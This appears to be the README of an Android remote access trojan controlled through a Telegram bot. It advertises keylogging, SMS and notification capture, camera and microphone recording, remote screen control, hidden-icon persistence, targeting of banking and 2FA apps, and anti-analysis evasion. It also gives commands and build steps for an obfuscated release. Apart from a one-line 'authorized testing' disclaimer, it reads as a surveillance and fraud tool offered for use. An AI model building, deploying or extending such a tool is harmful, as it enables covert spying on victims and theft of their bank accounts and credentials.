# Forsaken-Enhanced (FULL + Hardening)

Serverless Android RAT via Telegram long-poll. No VPS.

## Scope completed (including former out-of-scope except VNC)

### Core (original + first upgrades)
- Telegram C2, Shizuku, Accessibility, camera/mic/screenrecord, SMS, files, etc.
- Keylogger, notification live filter, device tags, hide icon
- Auto-permission, overlay/webview, screen tap/swipe/type, persistence, USSD/SIM, anti-analysis report

### Newly integrated (former out-of-scope)
| Item | Implementation |
|------|----------------|
| Stronger obfuscation | `minifyEnabled true` + expanded `proguard-rules.pro` (repackage, strip logs) |
| String/config crypto | `CryptoHelper` + `ConfigCryptoHelper` — encrypted `config.enc`, `/crypt` `/decrypt`, `/settoken` `/setchat` |
| Banking/2FA awareness | `BankingHelper` — `/banks`, `/banks prioritize` (adds packs to notif filter) |
| Runtime hardening | `HardeningHelper` — debugger/emulator/root/ADB checks, optional kill-on-analysis, exclude-recents flag, rebuild tips |
| Rebuild guidance | `/harden tips` documents applicationId rename + release build |

### VNC-lite (integrated)
- Continuous screenshot stream to Telegram (JPEG, configurable interval/quality/width)
- Interactive control via existing `/tap` `/swipe` `/type` `/back` `/home` `/lock`
- Backend: `screencap` via Shizuku or root (same as `/screenshot`)
- Commands: `/vnc start [sec] [quality] [maxWidth]` · `/vnc stop` · `/vnc status`
- Not classic RFB/VNC (no socket server — stays serverless on Telegram)

### Explicitly NOT included
- Classic VNC/RFB server with realtime 15–30 FPS socket stream (needs reachable host or heavy local encoder + bandwidth)
- Magisk/Zygisk modules or real banking root-hide (requires system-level mods outside APK)

## New commands

```
/banks
/banks prioritize
/harden
/harden kill on|off
/harden recents
/harden tips
/settoken <bot_token>
/setchat <chat_id>
/crypt <text>
/decrypt <blob>
```

## Build (release recommended)

1. Set `applicationId` to something unique in `app/build.gradle`
2. Put token/chat in `assets/config.txt` OR push later via `/settoken` + `/setchat`
3. `./gradlew assembleRelease` (ProGuard/R8 runs with minifyEnabled true)
4. Install, grant Accessibility + Notification + Overlay + Battery + OEM autostart
5. `/hide` + `/persist battery` + `/persist autostart` + `/banks prioritize`

## Legal

Authorized testing / education only.
